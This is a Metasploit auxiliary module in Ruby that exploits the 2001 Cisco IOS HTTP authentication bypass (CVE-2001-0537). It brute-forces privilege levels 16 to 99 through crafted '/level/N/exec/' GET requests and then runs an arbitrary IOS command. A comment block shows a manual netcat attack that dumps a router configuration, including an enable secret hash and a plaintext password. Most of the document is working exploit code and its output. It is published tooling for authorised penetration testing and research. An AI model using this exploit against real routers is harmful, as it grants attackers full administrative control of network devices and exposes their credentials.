##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##


require 'msf/core'


class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'Cisco IOS HTTP Unauthorized Administrative Access',
			'Description'    => %q{
				This module exploits a vulnerability in the Cisco IOS HTTP Server.
				By sending a GET request for "/level/num/exec/..", where num is between
				16 and 99, it is possible to bypass authentication and obtain full system
				control. IOS 11.3 -> 12.2 are reportedly vulnerable. This module
				tested successfully against a Cisco 1600 Router IOS v11.3(11d).
			},
			'Author'		=> [ 'Patrick Webster <patrick[at]aushack.com>' ],
			'License'		=> MSF_LICENSE,
			'Version'		=> '$Revision$',
			'References'	=>
				[
					[ 'BID', '2936'],
					[ 'CVE', '2001-0537'],
					[ 'URL', 'http://www.cisco.com/warp/public/707/cisco-sa-20010627-ios-http-level.shtml'],
					[ 'OSVDB', '578' ],
				],
			'DisclosureDate' => 'June 27 2001'))

		register_options(
			[
				Opt::RPORT(80),
				OptString.new('CMD', [ true, "Cisco IOS command", 'show start' ])
			], self.class)
						
	end

	def run
		print_status("Looking for a vulnerable privilege level...")

		16.upto(99) do | level |
			connect

			sploit = "GET /level/" + level.to_s + "/exec/show%20privilege HTTP/1.0\r\n\r\n"
			sock.put(sploit)

			result = sock.get(-1,-3)
			disconnect

			if (result =~ /Current privilege level is/)
				print_status("Found vulnerable privilege level: " + level.to_s)
				xCMD = Rex::Text.uri_encode(datastore['CMD'], 'hex-normal')
				print_status("Sending your encoded command: " + xCMD)

				connect

				sploit = "GET /level/" + level.to_s + "/exec/" + xCMD + " HTTP/1.0\r\n\r\n"
				sock.put(sploit)

				result = sock.get(-1,-3)
				print_status(result.to_s)

				disconnect
				break
			end

		end
		
	end

end

=begin

Patrick Webster 20070922 Cisco 1600 Router IOS v11.3(11d).

IOS info:
	IOS (tm) 1600 Software (C1600-Y-L), Version 11.3(11d), RELEASE SOFTWARE (fc1)
	Copyright (c) 1986-2003 by cisco Systems, Inc.
	Compiled Tue 22-Jul-03 17:00 by eaarmas

Example Exploit:

	patrick@aushack ~
	$ nc 172.16.32.2 80
	GET /level/15/exec/show%20start HTTP/1.0

	HTTP/1.0 401 Unauthorized
	Date: Mon, 01 Mar 1993 00:20:41 UTC
	Content-type: text/html
	Expires: Thu, 16 Feb 1989 00:00:00 GMT
	WWW-Authenticate: Basic realm="level 15 access"

	<HEAD><TITLE>Authorization Required</TITLE></HEAD><BODY><H1>Authorization Requir
	ed</H1>Browser not authentication-capable or authentication failed.</BODY>

	patrick@aushack ~
	$ nc 172.16.32.2 80
	GET /level/16/exec/show%20start HTTP/1.0

	HTTP/1.0 200 OK
	Date: Mon, 01 Mar 1993 00:21:31 UTC
	Server: cisco-IOS/11.3 HTTP-server/1.0(1)
	Content-type: text/html
	Expires: Thu, 16 Feb 1989 00:00:00 GMT


	<HTML><HEAD><TITLE>Router /level/16/exec/show start</TITLE></HEAD>
	<BODY><H1>Router</H1><PRE><HR>
	<FORM METHOD=POST ACTION="/level/16/exec/show start"><DL>
	Using 653 out of 7506 bytes
	!
	version 11.1
	no service udp-small-servers
	no service tcp-small-servers
	!
	hostname Router
	!
	boot system flash c1600-y-l.113-11d.bin
	boot system flash
	enable secret 5 $1$nDn5$pcheGox3RoCdQNjfq5BHe1
	enable password cisco
	!
	[snip]

=end